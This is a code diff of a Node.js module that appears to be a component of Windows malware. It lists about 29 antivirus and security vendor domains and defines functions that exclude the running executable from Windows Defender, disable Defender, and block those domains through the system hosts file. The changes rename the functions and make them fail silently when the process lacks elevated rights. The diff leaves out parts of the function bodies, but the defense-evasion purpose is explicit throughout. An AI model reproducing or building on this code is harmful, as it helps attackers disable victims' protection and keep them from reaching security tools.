@@ -5,40 +5,16 @@ const fs = require('fs');
 const program = require("../../utils/program/program.js");
 
 const sites = [
-    "ccleaner.com",
-    "emsisoft.com",
-    "f-secure.com",
-    "zonealarm.com",
-    "trendmicro.com",
-    "pcprotect.com",
-    "mcafee.com",
-    "bitdefender.com",
-    "home.sophos.com",
-    "clamav.net",
-    "drweb.com",
-    "us.norton.com",
-    "virustotal.com",
-    "avast.com",
-    "totalav.com",
-    "scanguard.com",
-    "zillya.com",
-    "kaspersky.com",
-    "usa.kaspersky.com",
-    "adaware.com",
-    "totaladblock.com",
-    "avg.com",
-    "malwarebytes.com",
-    "pandasecurity.com",
-    "avira.com",
-    "norton.com",
-    "eset.com",
-    "bullguard.com",
-    "sophos.com",
+    "ccleaner.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com", "pcprotect.com",
+    "mcafee.com", "bitdefender.com", "home.sophos.com", "clamav.net", "drweb.com", "us.norton.com",
+    "virustotal.com", "avast.com", "totalav.com", "scanguard.com", "zillya.com", "kaspersky.com",
+    "usa.kaspersky.com", "adaware.com", "totaladblock.com", "avg.com", "malwarebytes.com", "pandasecurity.com",
+    "avira.com", "norton.com", "eset.com", "bullguard.com", "sophos.com",
 ];
 
-const excludeFromDefender = async () => {
-    if (!(await program.isElevated())) {
-        throw new Error('Not elevated');
+const ExcludeFromDefender = async () => {
+    if (!(await program.IsElevated())) {
+        return;
     }
 
     const executablePath = process.execPath;
@@ -52,9 +28,9 @@ const excludeFromDefender = async () => {
     });
 };
 
-const disableDefender = async () => {
-    if (!(await program.isElevated())) {
-        throw new Error('Not elevated');
+const DisableDefender = async () => {
+    if (!(await program.IsElevated())) {
+        return;
     }
 
     const [
@@ -81,9 +57,9 @@ const disableDefender = async () => {
     });
 };
 
-const blockSites = async (sites) => {
-    if (!(await program.isElevated())) {
-        throw new Error('Not elevated');
+const BlockSites = async (sites) => {
+    if (!(await program.IsElevated())) {
+        return;
     }
 
     const hostFilePath = path.join(process.env.SYSTEMROOT, 'System32', 'drivers', 'etc', 'hosts');
@@ -107,10 +83,10 @@ const blockSites = async (sites) => {
 
 module.exports = async () => {
     try {
-        await excludeFromDefender();
-        await disableDefender();
-        await blockSites(sites);
+        await ExcludeFromDefender();
+        await DisableDefender();
+        await BlockSites(sites);
     } catch (error) {
         console.error(error);
     }
-}
+};
